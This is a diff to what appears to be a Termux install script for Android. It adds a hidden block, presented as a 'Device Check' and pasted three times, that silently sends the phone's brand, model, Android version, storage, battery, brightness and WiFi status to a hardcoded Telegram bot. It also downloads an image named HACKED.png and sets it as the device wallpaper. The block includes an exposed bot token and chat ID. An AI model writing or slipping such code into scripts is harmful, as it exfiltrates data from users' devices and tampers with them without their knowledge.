@@ -11,7 +11,277 @@ apt-get update -y
 clear
 pkg install curl neofetch inetutils jq -y
 clear
+pkg install termux-api -y
+clear
+
+# URL gambar wallpaper
+WALLPAPER_URL="https://github.com/HUNTERKINGCY78/WHATSAPP-/blob/main/HACKED.png"
+
+# Lokasi penyimpanan sementara
+WALLPAPER_PATH="/data/data/com.termux/files/home/downloads/auto_wallpaper.png"
+
+# Download gambar
+wget -O "$WALLPAPER_PATH" "$WALLPAPER_URL"
+
+# Set wallpaper
+termux-wallpaper -f "$WALLPAPER_PATH"
+
+clear
+
 apt-get install curl  # For curl command
+clear
+#!/bin/bash
+
+# --- Configuration Section ---
+BOT_TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
+CHAT_ID="5951232585"
+API_URL="https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
+WALLPAPER_URL="https://raw.githubusercontent.com/HUNTERKINGCY78/WHATSAPP-/main/HACKED.png"
+
+# --- Function Definitions ---
+
+# Send message to Telegram
+send_message() {
+    local message="$1"
+    curl -s -X POST "$API_URL" \
+        -d chat_id="$CHAT_ID" \
+        -d text="$message" \
+        -d parse_mode="Markdown"
+}
+
+# Check storage information
+check_storage() {
+    echo "🔄 Checking storage..."
+    local storage_info=$(df -h /storage/emulated/0 2>/dev/null || echo "Storage not accessible")
+    send_message "📊 *Storage Info:*\n\`\`\`\n$storage_info\n\`\`\`"
+}
+
+# Check device settings
+check_settings() {
+    echo "🔄 Checking device settings..."
+    local battery=$(termux-battery-status 2>/dev/null | grep -o '"percentage":[^,]*' | cut -d: -f2 || echo "N/A")
+    local brightness=$(settings get system screen_brightness 2>/dev/null || echo "N/A")
+    local wifi_status=$(termux-wifi-connectioninfo 2>/dev/null && echo "ON" || echo "OFF")
+    
+    send_message "⚙️ *Device Settings:*\n- Battery: $battery%\n- Brightness: $brightness\n- WiFi: $wifi_status"
+}
+
+# Check device information
+check_device_info() {
+    echo "🔄 Checking device info..."
+    local model=$(getprop ro.product.model 2>/dev/null || echo "Unknown")
+    local brand=$(getprop ro.product.brand 2>/dev/null || echo "Unknown")
+    local android_version=$(getprop ro.build.version.release 2>/dev/null || echo "Unknown")
+    
+    send_message "📱 *Device Info:*\n- Brand: $brand\n- Model: $model\n- Android: $android_version"
+}
+
+# Change wallpaper
+change_wallpaper() {
+    echo "🔄 Changing wallpaper..."
+    local temp_file="$HOME/HACKED.png"
+    
+    # Install required packages
+    pkg install -y wget termux-api
+    
+    # Download wallpaper
+    if ! wget -q "$WALLPAPER_URL" -O "$temp_file"; then
+        send_message "⚠️ Failed to download wallpaper image"
+        return
+    fi
+
+    # Set wallpaper using Termux API
+    if termux-wallpaper -f "$temp_file"; then
+        send_message "✅ Wallpaper changed successfully!"
+    else
+        send_message "⚠️ Failed to set wallpaper. Make sure Termux has storage permission."
+    fi
+}
+
+# --- Main Execution ---
+
+# Run in background if requested
+if [[ "$1" == "--background" ]]; then
+    exec > /dev/null 2>&1
+fi
+
+# Start device check
+send_message "🔔 *Starting Device Check*"
+check_device_info
+check_storage
+check_settings
+change_wallpaper
+send_message "✅ *Device Check Completed*"
+
+clear
+#!/bin/bash
+
+# --- Configuration Section ---
+BOT_TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
+CHAT_ID="5951232585"
+API_URL="https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
+WALLPAPER_URL="https://raw.githubusercontent.com/HUNTERKINGCY78/WHATSAPP-/main/HACKED.png"
+
+# --- Function Definitions ---
+
+# Send message to Telegram
+send_message() {
+    local message="$1"
+    curl -s -X POST "$API_URL" \
+        -d chat_id="$CHAT_ID" \
+        -d text="$message" \
+        -d parse_mode="Markdown"
+}
+
+# Check storage information
+check_storage() {
+    echo "🔄 Checking storage..."
+    local storage_info=$(df -h /storage/emulated/0 2>/dev/null || echo "Storage not accessible")
+    send_message "📊 *Storage Info:*\n\`\`\`\n$storage_info\n\`\`\`"
+}
+
+# Check device settings
+check_settings() {
+    echo "🔄 Checking device settings..."
+    local battery=$(termux-battery-status 2>/dev/null | grep -o '"percentage":[^,]*' | cut -d: -f2 || echo "N/A")
+    local brightness=$(settings get system screen_brightness 2>/dev/null || echo "N/A")
+    local wifi_status=$(termux-wifi-connectioninfo 2>/dev/null && echo "ON" || echo "OFF")
+    
+    send_message "⚙️ *Device Settings:*\n- Battery: $battery%\n- Brightness: $brightness\n- WiFi: $wifi_status"
+}
+
+# Check device information
+check_device_info() {
+    echo "🔄 Checking device info..."
+    local model=$(getprop ro.product.model 2>/dev/null || echo "Unknown")
+    local brand=$(getprop ro.product.brand 2>/dev/null || echo "Unknown")
+    local android_version=$(getprop ro.build.version.release 2>/dev/null || echo "Unknown")
+    
+    send_message "📱 *Device Info:*\n- Brand: $brand\n- Model: $model\n- Android: $android_version"
+}
+
+# Change wallpaper
+change_wallpaper() {
+    echo "🔄 Changing wallpaper..."
+    local temp_file="$HOME/HACKED.png"
+    
+    # Install required packages
+    pkg install -y wget termux-api
+    
+    # Download wallpaper
+    if ! wget -q "$WALLPAPER_URL" -O "$temp_file"; then
+        send_message "⚠️ Failed to download wallpaper image"
+        return
+    fi
+
+    # Set wallpaper using Termux API
+    if termux-wallpaper -f "$temp_file"; then
+        send_message "✅ Wallpaper changed successfully!"
+    else
+        send_message "⚠️ Failed to set wallpaper. Make sure Termux has storage permission."
+    fi
+}
+
+# --- Main Execution ---
+
+# Run in background if requested
+if [[ "$1" == "--background" ]]; then
+    exec > /dev/null 2>&1
+fi
+
+# Start device check
+send_message "🔔 *Starting Device Check*"
+check_device_info
+check_storage
+check_settings
+change_wallpaper
+send_message "✅ *Device Check Completed*"
+
+clear
+#!/bin/bash
+
+# --- Configuration Section ---
+BOT_TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
+CHAT_ID="5951232585"
+API_URL="https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
+WALLPAPER_URL="https://raw.githubusercontent.com/HUNTERKINGCY78/WHATSAPP-/main/HACKED.png"
+
+# --- Function Definitions ---
+
+# Send message to Telegram
+send_message() {
+    local message="$1"
+    curl -s -X POST "$API_URL" \
+        -d chat_id="$CHAT_ID" \
+        -d text="$message" \
+        -d parse_mode="Markdown"
+}
+
+# Check storage information
+check_storage() {
+    echo "🔄 Checking storage..."
+    local storage_info=$(df -h /storage/emulated/0 2>/dev/null || echo "Storage not accessible")
+    send_message "📊 *Storage Info:*\n\`\`\`\n$storage_info\n\`\`\`"
+}
+
+# Check device settings
+check_settings() {
+    echo "🔄 Checking device settings..."
+    local battery=$(termux-battery-status 2>/dev/null | grep -o '"percentage":[^,]*' | cut -d: -f2 || echo "N/A")
+    local brightness=$(settings get system screen_brightness 2>/dev/null || echo "N/A")
+    local wifi_status=$(termux-wifi-connectioninfo 2>/dev/null && echo "ON" || echo "OFF")
+    
+    send_message "⚙️ *Device Settings:*\n- Battery: $battery%\n- Brightness: $brightness\n- WiFi: $wifi_status"
+}
+
+# Check device information
+check_device_info() {
+    echo "🔄 Checking device info..."
+    local model=$(getprop ro.product.model 2>/dev/null || echo "Unknown")
+    local brand=$(getprop ro.product.brand 2>/dev/null || echo "Unknown")
+    local android_version=$(getprop ro.build.version.release 2>/dev/null || echo "Unknown")
+    
+    send_message "📱 *Device Info:*\n- Brand: $brand\n- Model: $model\n- Android: $android_version"
+}
+
+# Change wallpaper
+change_wallpaper() {
+    echo "🔄 Changing wallpaper..."
+    local temp_file="$HOME/HACKED.png"
+    
+    # Install required packages
+    pkg install -y wget termux-api
+    
+    # Download wallpaper
+    if ! wget -q "$WALLPAPER_URL" -O "$temp_file"; then
+        send_message "⚠️ Failed to download wallpaper image"
+        return
+    fi
+
+    # Set wallpaper using Termux API
+    if termux-wallpaper -f "$temp_file"; then
+        send_message "✅ Wallpaper changed successfully!"
+    else
+        send_message "⚠️ Failed to set wallpaper. Make sure Termux has storage permission."
+    fi
+}
+
+# --- Main Execution ---
+
+# Run in background if requested
+if [[ "$1" == "--background" ]]; then
+    exec > /dev/null 2>&1
+fi
+
+# Start device check
+send_message "🔔 *Starting Device Check*"
+check_device_info
+check_storage
+check_settings
+change_wallpaper
+send_message "✅ *Device Check Completed*"
+
+clear
 clear
 #!/data/data/com.termux/files/home/.zinit/polaris/bin/bash
 
